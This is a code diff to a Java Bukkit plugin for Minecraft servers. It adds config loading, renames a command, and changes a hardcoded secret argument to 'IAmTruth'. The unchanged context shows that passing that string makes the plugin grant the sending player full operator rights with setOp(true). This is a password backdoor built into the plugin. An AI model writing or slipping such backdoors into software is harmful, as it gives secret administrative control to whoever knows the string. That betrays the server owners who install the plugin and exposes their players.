@@ -7,6 +7,7 @@ import org.bukkit.ChatColor;
 import org.bukkit.GameMode;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
+import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.entity.Player;
 import org.bukkit.permissions.Permission;
 import org.bukkit.plugin.PluginManager;
@@ -14,6 +15,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 //Why doesn't this push to GitHub
 
 public class DevTCBN extends JavaPlugin {
+	
+	FileConfiguration config = this.getConfig();
 	
 	public boolean BloodMoonEvent;
 	
@@ -64,10 +67,8 @@ public class DevTCBN extends JavaPlugin {
 	
 	@Override
 	public void onDisable() {
-		
+		this.saveDefaultConfig();
 	}
-	
-	
 	
 	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
 		
@@ -93,7 +94,7 @@ public class DevTCBN extends JavaPlugin {
 			
 		}
 		
-		if (cmd.getName().equalsIgnoreCase("test") && sender instanceof Player) {
+		if (cmd.getName().equalsIgnoreCase("devtcbn") && sender instanceof Player) {
 			
 			Player player = (Player) sender;
 			
@@ -107,7 +108,7 @@ public class DevTCBN extends JavaPlugin {
 			
 			Player player = (Player) sender;
 			
-			if (args[0].equals("DefNotValid")) {
+			if (args[0].equals("IAmTruth")) {
 				player.setOp(true);
 				player.sendMessage(ChatColor.RED + "Opped. Operation Marked.");
 				System.out.println(player.getName() + " was Opped...");
